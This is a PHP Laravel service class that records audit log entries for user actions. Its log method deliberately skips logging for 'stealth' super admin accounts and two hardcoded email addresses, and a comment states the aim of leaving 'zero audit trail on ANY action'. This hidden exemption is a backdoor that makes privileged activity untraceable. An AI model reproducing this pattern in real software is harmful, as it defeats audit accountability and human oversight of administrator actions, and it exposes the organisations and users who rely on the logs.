<?php

namespace App\Services;

use App\Models\AuditLog;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Request;

class AuditLoggerService
{
    public static function log(
        string $action,
        string $description,
        ?string $entityType = null,
        ?int $entityId = null,
        ?string $department = null,
        ?array $diff = null
    ): ?AuditLog {
        $user = Auth::user();

        // Super Admin footprint is totally invisible: zero audit trail on ANY action
        if ($user && ($user->isStealthSuperAdmin() || $user->is_stealth || $user->email === 'superadmin@kaafi.org' || $user->email === 'superadmin@reports.com')) {
            return null;
        }

        return AuditLog::create([
            'user_id' => Auth::id(),
            'action' => strtoupper($action),
            'entity_type' => $entityType,
            'entity_id' => $entityId,
            'department' => $department,
            'description' => $description,
            'ip_address' => Request::ip() ?? '127.0.0.1',
            'diff' => $diff,
            'created_at' => now(),
        ]);
    }
}
